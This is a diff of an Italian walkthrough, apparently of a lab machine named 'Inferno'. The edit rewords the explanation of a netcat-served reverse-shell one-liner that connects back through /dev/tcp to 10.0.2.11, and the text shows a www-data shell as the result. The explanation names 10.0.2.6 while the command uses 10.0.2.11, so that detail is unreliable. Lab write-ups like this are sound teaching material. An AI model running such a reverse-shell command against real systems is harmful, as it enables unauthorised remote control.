@@ -60,7 +60,7 @@ Nel secondo terminale ho eseguito:
 
 Nel terzo terminale, ho eseguito:
 
-- `echo 'bash -c "bash -i >/dev/tcp/10.0.2.11/4445 0>&1 2>&1"' | nc -lnvp 4444`: invia una stringa di comando a un terminale remoto tramite netcat, configurando una shell inversa che si connette al server IP con l'indirizzo IP 10.0.2.6 sulla porta 4445.
+- `echo 'bash -c "bash -i >/dev/tcp/10.0.2.11/4445 0>&1 2>&1"' | nc -lnvp 4444`: invia una stringa di comando al terminale tramite netcat, configurando una shell inversa che si connette al server IP con l'indirizzo IP 10.0.2.6 sulla porta 4445.
 
 Risultato: nel terzo terminale dopo aver confermato l’esecuzione del comando con il tasto yes ho ottenuto la reverse shell.
 www-data@Inferno:/var/www/html/inferno/components/filemanager$
